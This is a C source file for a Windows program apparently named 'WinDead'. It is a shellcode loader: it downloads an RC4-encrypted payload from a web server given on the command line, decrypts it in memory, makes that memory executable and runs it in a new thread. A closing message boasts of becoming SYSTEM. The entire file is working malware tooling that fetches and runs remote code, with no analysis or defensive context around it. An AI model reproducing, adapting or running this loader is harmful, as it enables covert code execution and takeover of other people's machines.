#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <stdlib.h>
#include <ctype.h>
#include "GetFromRemote.h"
#include "rc4.h"

#pragma comment (lib, "Wininet.lib")

#define sKey 32 // The size of the key, if you changed in ShellCrypt.c don't forget to change here

int main(int argc, char* argv[]) {

	if (argc < 5) {
		printf("[!] Missing argument(s) !\n"
			"[i] Usage : <Ip address of the web server> <Port of the web server> <Name of the file containing the encrypted shellcode> <The key used to encrypt the shellcode>\n"
			"[i] Usage example : WinDead.exe 192.168.1.150 8080 shellcode.enc fffffffff....\n");
		return -1;
	}

	char			Url[1024];						// Buffer to store the url
	PBYTE			pEncryptedShellcode = NULL;		// Pointer to the encrypted shellcode
	SIZE_T			sEncryptedShellcode = 0;		// Pointer to the size of the encrypted shellcode
	DWORD			dwOldProtection = 0;		// Use to change the memory protection
	const char* hexKey = argv[4];	// The hexadecimal key used to encrypt the shellcode
	unsigned char	pKey[sKey] = { 0 };	// Pointer to the key in bytes format

	// Converting the hexadecimal key, in string format, to bytes format
	for (size_t i = 0; i < sKey; i++) {
		char hex[3] = { hexKey[i * 2], hexKey[i * 2 + 1], 0 }; // The 0 is for the null byte
		pKey[i] = (unsigned char)strtol(hex, NULL, 16);
	}

	// Constructing the url by retrieving the value given as arguments
	if (!sprintf_s(Url, 1024, "http://%s:%s/%s", argv[1], argv[2], argv[3])) {
		printf("[!] Failed to construct the url !");
		return -1;
	}

	// Retrieving the encrypted shellcode
	if (!GetPayloadFromHTTPServer(Url, &pEncryptedShellcode, &sEncryptedShellcode)) {
		printf("[!] Failed to download the file ! Maybe check the connection with your web server or the name of your file...");
		return -1;
	}


	// Allocating a buffer for the decrypted shellcode
	PVOID pShellcodeAddress = VirtualAlloc(NULL, sEncryptedShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] Failed to allocate a buffer for the decrypted shellcode\n"
			"Error : %d", GetLastError());
		memset(pEncryptedShellcode, 0x00, sEncryptedShellcode);
		LocalFree(pEncryptedShellcode);
		return -1;
	}
	printf("[i] Buffer allocated with success ! \n");

	// Decrypting the shellcode
	Rc4Context ctx = { 0 };
	rc4Init(&ctx, pKey, sKey);
	rc4Cipher(&ctx, pEncryptedShellcode, pShellcodeAddress, sEncryptedShellcode);


	// Changing the memory protection to be allowed to execute the shellcode
	if (!VirtualProtect(pShellcodeAddress, sEncryptedShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] Failed to change the protection of the memory \n"
			"Error : %d", GetLastError());
		memset(pEncryptedShellcode, 0x00, sEncryptedShellcode);
		LocalFree(pEncryptedShellcode);
		VirtualFree(pShellcodeAddress, 0x00, MEM_RELEASE);
		return -1;
	}
	printf("[i] Memory protection changed with success ! \n");


	// Creating a new thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[!] Failed to create a thread for the shellcode, it means it was not executed... \n"
			"Errro : %d", GetLastError());
		memset(pEncryptedShellcode, 0x00, sEncryptedShellcode);
		LocalFree(pEncryptedShellcode);
		VirtualFree(pShellcodeAddress, 0x00, MEM_RELEASE);
		return -1;
	}
	printf("[i] Your shellcode has been executed with success ! Now, time to become SYSTEM =)\n");
	WaitForSingleObject(hThread, INFINITE);



	memset(pEncryptedShellcode, 0x00, sEncryptedShellcode);
	LocalFree(pEncryptedShellcode);
	VirtualFree(pShellcodeAddress, 0x00, MEM_RELEASE);

	return 0;
}
